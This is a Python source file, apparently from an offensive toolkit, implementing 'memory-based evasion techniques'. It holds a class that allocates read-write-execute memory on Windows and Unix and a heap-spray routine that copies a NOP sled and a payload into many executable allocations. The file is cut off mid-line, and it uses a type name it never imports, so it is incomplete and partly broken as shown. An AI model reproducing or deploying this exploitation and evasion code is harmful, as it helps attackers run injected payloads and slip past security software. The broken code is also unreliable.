"""
Memory-based evasion techniques
"""

import os
import sys
import ctypes
import mmap
import random
from typing import Optional, Callable, Any

class MemoryEvasion:
    """Memory manipulation and evasion techniques"""
    
    def __init__(self):
        self.platform = sys.platform
        
        if self.platform == 'win32':
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
    
    def allocate_executable_memory(self, size: int) -> Optional[int]:
        """Allocate executable memory region"""
        if self.platform == 'win32':
            # Windows: VirtualAlloc
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            
            addr = self.kernel32.VirtualAlloc(
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            return addr
            
        elif self.platform in ['linux', 'linux2', 'darwin']:
            # Unix: mmap
            PROT_READ = 0x1
            PROT_WRITE = 0x2
            PROT_EXEC = 0x4
            MAP_PRIVATE = 0x2
            MAP_ANONYMOUS = 0x20
            
            libc = ctypes.CDLL(None)
            mmap_func = libc.mmap
            mmap_func.restype = ctypes.c_void_p
            
            addr = mmap_func(
                None,
                size,
                PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS,
                -1,
                0
            )
            
            if addr == -1:
                return None
                
            return addr
        
        return None
    
    def heap_spray(self, payload: bytes, spray_size: int = 100) -> List[int]:
        """Perform heap spray technique"""
        allocations = []
        
        # NOP sled
        nop_sled = b'\x90' * 0x1000  # 4KB of NOPs
        
        for _ in range(spray_size):
            try:
                # Allocate memory
                size = len(nop_sled) + len(payload)
                
                if self.platform == 'win32':
                    addr = self.kernel32.VirtualAlloc(
                        None, size, 0x1000 | 0x2000, 0x40
                    )
                    
                    if addr:
                        # Write NOP sled + payload
                        ctypes.memmove(addr, nop_sled + payload, size)
                        allocations.append(addr)
                else:
                    # Use Python allocation
                    data = nop_sled + payloa
